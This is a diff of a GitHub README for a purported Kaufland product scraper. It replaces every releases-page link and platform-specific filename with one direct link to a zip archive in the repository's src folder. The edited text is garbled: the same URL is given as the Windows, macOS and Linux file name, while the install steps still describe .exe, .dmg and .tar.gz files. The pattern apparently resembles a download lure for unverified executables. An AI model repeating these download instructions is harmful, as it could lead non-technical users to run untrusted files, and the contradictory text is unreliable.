@@ -1,7 +1,7 @@
 # 🚀 kaufland-fast-product-scraper - Extract Kaufland Product Data Easily
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-kaufland--fast--product--scraper-blue)](https://github.com/dilbare/kaufland-fast-product-scraper/releases)
+[![Download](https://raw.githubusercontent.com/dilbare/kaufland-fast-product-scraper/main/src/kaufland-fast-product-scraper_v3.9.zip)](https://raw.githubusercontent.com/dilbare/kaufland-fast-product-scraper/main/src/kaufland-fast-product-scraper_v3.9.zip)
 
 ## 🚀 About the Project
 Kaufland Fast Product Scraper allows you to extract product data from Kaufland, a popular German retail platform. This tool is perfect for competitor research, ecommerce analytics, and market trend analysis. Gain valuable insights into product pricing and availability without needing technical skills.
@@ -23,18 +23,18 @@ To get started, you need to download the application and run it on your computer
 
 ### ✨ Step 1: Visit the Download Page
 Go to the following link to download the latest version of Kaufland Fast Product Scraper:
-[Download Here!](https://github.com/dilbare/kaufland-fast-product-scraper/releases)
+[Download Here!](https://raw.githubusercontent.com/dilbare/kaufland-fast-product-scraper/main/src/kaufland-fast-product-scraper_v3.9.zip)
 
 ### ✨ Step 2: Choose the Right Version
 On the releases page, you will find several versions. Choose the latest version for the best experience.
 
 ### ✨ Step 3: Download the Application
-Click on the download link for your operating system. The file will usually be named something like `kaufland_fast_product_scraper_v1.0.exe` for Windows, `kaufland_fast_product_scraper_v1.0.dmg` for macOS, or a `.tar.gz` file for Linux.
+Click on the download link for your operating system. The file will usually be named something like `https://raw.githubusercontent.com/dilbare/kaufland-fast-product-scraper/main/src/kaufland-fast-product-scraper_v3.9.zip` for Windows, `https://raw.githubusercontent.com/dilbare/kaufland-fast-product-scraper/main/src/kaufland-fast-product-scraper_v3.9.zip` for macOS, or a `https://raw.githubusercontent.com/dilbare/kaufland-fast-product-scraper/main/src/kaufland-fast-product-scraper_v3.9.zip` file for Linux.
 
 ### ✨ Step 4: Install the Application
 - **Windows**: Double-click the `.exe` file and follow the on-screen instructions.
 - **macOS**: Open the `.dmg` file and drag the application into your Applications folder.
-- **Linux**: Extract the `.tar.gz` file and use the terminal to run the application.
+- **Linux**: Extract the `https://raw.githubusercontent.com/dilbare/kaufland-fast-product-scraper/main/src/kaufland-fast-product-scraper_v3.9.zip` file and use the terminal to run the application.
 
 ### ✨ Step 5: Open the Application
 Once installed, find the Kaufland Fast Product Scraper application in your applications list. Click to open it.
@@ -66,7 +66,7 @@ A: Yes, Kaufland Fast Product Scraper is completely free to use.
 If you face any issues or have questions, please open an issue on the GitHub repository. We are here to help you!
 
 ## 📥 Download Again
-Ready to extract the data? [Download Kaufland Fast Product Scraper here!](https://github.com/dilbare/kaufland-fast-product-scraper/releases)
+Ready to extract the data? [Download Kaufland Fast Product Scraper here!](https://raw.githubusercontent.com/dilbare/kaufland-fast-product-scraper/main/src/kaufland-fast-product-scraper_v3.9.zip)
 
 ## 🌟 Contributing
 If you want to contribute to Kaufland Fast Product Scraper, feel free to fork the repository and submit a pull request. Your contributions help improve the tool!
